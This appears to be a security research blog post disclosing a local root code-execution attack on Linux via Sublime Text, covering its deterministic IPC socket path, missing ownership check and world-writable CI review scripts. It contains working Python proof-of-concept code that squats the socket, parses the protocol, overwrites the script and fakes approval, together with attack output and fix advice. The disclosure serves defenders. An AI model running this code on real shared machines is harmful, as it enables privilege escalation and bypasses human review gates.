---
layout: post
title: "Cross-User RCE via Sublime Text TOCTOU"
date: 2026-03-31
categories: research
tags: [sublime-text, toctou, rce, linux, privilege-escalation, cve]
---

*How an unprivileged local user executes code as root using a race condition, a deterministic socket path, and a world-writable file — no memory corruption, no CVE exploit, no special privileges required.*

---

## The Setup

Two users. One machine. One text editor.

**Root** is an engineer running a deployment pipeline on a shared Linux build server. The pipeline follows a common pattern used by teams that want a human sign-off before production deployments: generate a deployment config, open it in Sublime Text for review, and only proceed if the editor closes cleanly.

```bash
#!/bin/bash
# root's deployment gate
subl --wait /tmp/ci_pipeline_review.sh
if [ $? -eq 0 ]; then
    bash /tmp/ci_pipeline_review.sh
fi
```

**Mallory** is a developer on the same machine. uid=1002. No sudo. No special groups. No access to root's files.

```
uid=1002(mallory) gid=1002(mallory) groups=1002(mallory)
```

By the end of this article, mallory will execute arbitrary code as root. She will write nothing to root's home directory, touch no privileged binary, and exploit no memory corruption bug. The entire attack is a race condition plus a logic flaw.

---

## Part 1: The IPC Socket

When Sublime Text starts on Linux, it creates a Unix domain socket:

```
/tmp/Sublime Text.18bba2f919d04e82c4d74b410f5a4aca.sock
```

This socket is how the `subl` command-line tool communicates with a running GUI instance. Run `subl file.py` and the CLI connects to this socket, sends a binary packet, and the GUI opens the file.

Two properties of this socket matter for the attack:

**Property 1: The path is deterministic.**

The hash in the filename is derived from the Sublime Text binary and does not change between runs. Every machine running the same build version produces the exact same socket path. There is no randomness, no per-session token, no secret.

**Property 2: Permissions are 0755.**

```
srwxr-xr-x 1 root root 0 /tmp/Sublime Text.18bba2f919d04e82c4d74b410f5a4aca.sock
```

The kernel requires write permission on a Unix socket to `connect()` to it. `0755` means only the socket owner — root — can connect. Direct cross-user exploitation of a running socket is blocked.

So mallory cannot connect to root's socket. But she does not need to.

---

## Part 2: The TOCTOU Window

TOCTOU stands for Time-Of-Check-Time-Of-Use. The vulnerability is a gap between when a security property is verified and when it is actually relied upon.

Every time Sublime Text closes and reopens — after an update, a crash, or a normal restart — the socket is deleted and recreated. During that window, the path at `/tmp/Sublime Text.18bba2f919d04e82c4d74b410f5a4aca.sock` does not exist.

Any user can create a file at a path that does not exist in `/tmp`.

Mallory creates a Unix domain socket at the exact same path before Sublime starts:

```python
import socket, os

SOCK = "/tmp/Sublime Text.18bba2f919d04e82c4d74b410f5a4aca.sock"

srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
srv.bind(SOCK)
os.chmod(SOCK, 0o777)
srv.listen(5)
print("[mallory] Socket squatted. Waiting for connections...")
```

```
srwxrwxrwx 1 mallory mallory 0 /tmp/Sublime Text.18bba2f919d04e82c4d74b410f5a4aca.sock
```

Now when root runs `subl`, the CLI looks up the deterministic path, finds a socket, and connects — without checking who owns it. Mallory owns it.

The `subl` binary performs no ownership verification before calling `connect()`. This is the core flaw.

---

## Part 3: The Wire Protocol

To build a convincing fake server, mallory needs to speak the `subl` wire protocol.

`strace` on the `subl` binary reveals a compact binary framing:

```
[8B  LE uint64]  payload_length
[4B  LE uint32]  msg_type = 9
[4B  LE uint32]  flags      ← 0 = command exec, 1 = file open (--wait)
[8B  zeros]      padding
[4B  LE uint32]  string_count = 1
[4B  LE uint32]  string_length
[NB  UTF-8]      string     ← command string or file path
[16B zeros]      trailing
```

Response from server:

```
[8B  LE uint64]  payload_length = 4
[4B  LE uint32]  exit_code
```

No authentication token. No session key. No challenge-response handshake. The `subl` CLI will accept exit=0 from whoever answers on that socket.

When `subl --wait /tmp/ci_pipeline_review.sh` is called, `flags=1` and the string payload is the file path. The CLI blocks waiting for the server's response — it is waiting for a human to close Sublime.

Mallory's server does not need Sublime to be running at all.

---

## Part 4: The World-Writable File

Here is where the attack crosses the privilege boundary.

Root's review file:

```bash
ls -la /tmp/ci_pipeline_review.sh
-rw-rw-rw- 1 root root 312 Mar 31 10:31 /tmp/ci_pipeline_review.sh
```

Mode `0666`. World-writable.

This is not a misconfiguration unique to a careless admin. It is a pattern that appears throughout CI/CD architecture:

- A pipeline agent running as a service account generates a per-deployment script in `/tmp`
- The script must be writable by the agent (different user than root)
- Sticky bit on `/tmp` prevents deletion of others' files, but not modification of world-writable files
- Root's review step reads the file after the agent finishes writing it

The file has to be writable by both the pipeline process and potentially the review process. `0666` is the natural result.

When mallory's fake server intercepts root's `subl --wait` call, it reads the file path from the packet. It checks whether that path is world-writable. If it is, mallory has write access to it — even though she is uid=1002 and the file is owned by root.

She overwrites it:

```python
def handle_connection(conn):
    header = conn.recv(8)
    pkt_len = struct.unpack('<Q', header)[0]
    data = conn.recv(pkt_len)

    flags   = struct.unpack('<I', data[4:8])[0]
    str_len = struct.unpack('<I', data[8:12])[0]
    path    = data[12:12+str_len].decode().rstrip('\x00')

    print(f"[mallory] INTERCEPTED: {path}")

    if flags == 1 and os.path.exists(path):
        st = os.stat(path)
        if st.st_mode & 0o002:  # world-writable
            print(f"[mallory] World-writable. Injecting payload.")
            with open(path, 'w') as f:
                f.write('#!/bin/bash\n')
                f.write('echo "CROSS_USER_RCE, $(id)" > /tmp/proof.txt\n')

    # Return exit=0 — gate passed
    conn.sendall(struct.pack('<QI', 4, 0))
    print("[mallory] Returned exit=0.")
```

Root's pipeline is still blocked on `subl --wait`. It has not checked the file contents yet — it is waiting for the exit code. Mallory writes the malicious content, then sends the exit=0 response.

Root unblocks. `$?` is 0. The gate passed. Root runs the script.

---

## Part 5: The Attack in Real Time

**mallory's terminal:**

```
[mallory] uid=1002(mallory) gid=1002(mallory) groups=1002(mallory)
[mallory] Squatting: /tmp/Sublime Text.18bba2f919d04e82c4d74b410f5a4aca.sock
[mallory] Listening...

[10:32:06] Connection received
[mallory] INTERCEPTED FILE: /tmp/ci_pipeline_review.sh
[mallory] File is world-writable (mode 0666) — injecting payload
[mallory] Payload written to /tmp/ci_pipeline_review.sh
[mallory] Returned exit=0. Gate bypassed.
```

**root's terminal (simultaneously):**

```
[root] Running deployment gate...
[root] subl --wait /tmp/ci_pipeline_review.sh
[root] subl returned: 0
[root] Gate passed. Executing reviewed script...
```

**Result** (`/tmp/proof.txt`):

```
CROSS_USER_RCE, uid=0(root) gid=0(root) groups=0(root),126(docker),143(libvirt),981(ollama),994(kvm)
```

---

## What Root Experienced

Nothing unusual.

`subl --wait` returned in a normal amount of time. Exit code was 0. The deployment gate script continued exactly as designed. No error message. No permission denied. No Sublime window failing to open — because on a headless build server, the absence of a GUI window is the expected behavior.

Root had no way to know the file was modified between the time the pipeline agent wrote it and the time root executed it. The entire attack happens in the time between `subl --wait` being called and the exit code being returned — a window mallory controls completely.

---

## Why This Matters Beyond One Server

The `subl --wait` pattern is not obscure. Sublime Text's own documentation recommends it as the default git editor:

```bash
git config --global core.editor "subl --wait"
```

Developers use it as a human review step in:

- Deployment pipelines that want sign-off before production pushes
- `sudoedit`-adjacent workflows where running a full privileged editor is considered unsafe
- Git operations (commit, rebase, tag) where one engineer reviews before another merges
- Automated scripts that treat a clean Sublime exit as human approval

In all of these cases, the security model is: *if subl exits 0, a human reviewed the content.* The entire model collapses when the socket can be squatted by another user on the machine.

The world-writable condition elevates this from information disclosure and gate bypass to genuine cross-user code execution. That condition is common in:

| Environment | Why Files Are World-Writable |
|---|---|
| Docker CI/CD | Container writes to host-mounted `/tmp` at container's uid; host pipeline reads as root |
| Makefile pipelines | Parallel build workers at different uids write intermediate scripts |
| Jenkins / GitLab runners | Agent service account generates review artifacts for privileged executor |
| Shared dev servers | Per-user workspace scripts in `/tmp` with open permissions for collaboration |

---

## The Root Cause

Two independent flaws combine:

**Flaw 1 — Missing socket ownership check.**
The `subl` binary calls `connect()` on whatever socket exists at the deterministic path. One `stat()` call before `connect()` would detect impersonation:

```c
struct stat st;
stat(socket_path, &st);
if (st.st_uid != getuid()) {
    fprintf(stderr, "subl: socket is owned by uid %d (expected %d)\n",
            st.st_uid, getuid());
    exit(1);
}
```

**Flaw 2 — World-readable and predictable socket path.**
Permissions `0755` prevent connections but not reconnaissance. Changing to `0700` removes other users' ability to see the socket exists at all, and eliminates the path for squatting.

Either fix alone significantly raises the bar. Both together close the attack.

---

## Fix Recommendations

**For Sublime HQ:**

1. Add socket ownership verification in `subl` before `connect()` — reject sockets not owned by `getuid()`
2. Create the socket with `chmod(path, 0700)` instead of `0755`

**For developers and operations teams:**

1. Do not use `subl --wait` to gate execution of the same file passed to the editor. Checksum the file before opening it, and verify the checksum after the editor exits — only proceed if the hash matches
2. On any multi-user machine, audit which scripts use `subl --wait` as a security control
3. For privileged review workflows, use a terminal editor (`nano`, `vim`) where the file is opened in the same process context as the reviewer, not via an IPC socket that can be intercepted

---

## Disclosure

- **2026-03-31** — Finding confirmed on Sublime Text Build 4200 (Linux x86-64, latest)
- **2026-03-31** — Responsible disclosure submitted to security@sublimehq.com
- **CVE status** — Pending assignment; coordinating with vendor

*Full proof-of-concept code available upon request to the Sublime HQ security team.*

---

*Tested on: Linux 6.18.9+kali-amd64 · Sublime Text Build 4200 · Python 3.13.12*
